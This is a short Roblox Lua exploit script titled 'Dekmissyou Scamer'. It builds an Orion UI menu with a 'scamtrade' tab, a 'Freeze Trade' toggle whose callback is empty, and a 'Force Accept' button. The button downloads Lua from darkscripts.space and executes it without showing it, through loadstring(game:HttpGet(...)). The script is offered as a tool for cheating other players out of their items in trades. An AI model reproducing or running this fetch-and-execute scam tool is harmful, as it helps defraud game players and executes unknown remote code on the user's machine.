local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Dekmissyou Scamer", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
    Name = "scamtrade",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = Tab:AddSection({
    Name = "scamtrading"
}) 


OrionLib:MakeNotification({
    Name = "Missyou Hub",
    Content = "missyou hub",
    Image = "rbxassetid://4483345998",
    Time = 5
})


Tab:AddToggle({
    Name = "Freeze Trade",
    Default = false,
    Callback = function()
    end
})

Tab:AddButton({
    Name = "Force Accept",
    Callback = function()
        loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))()
         end
})
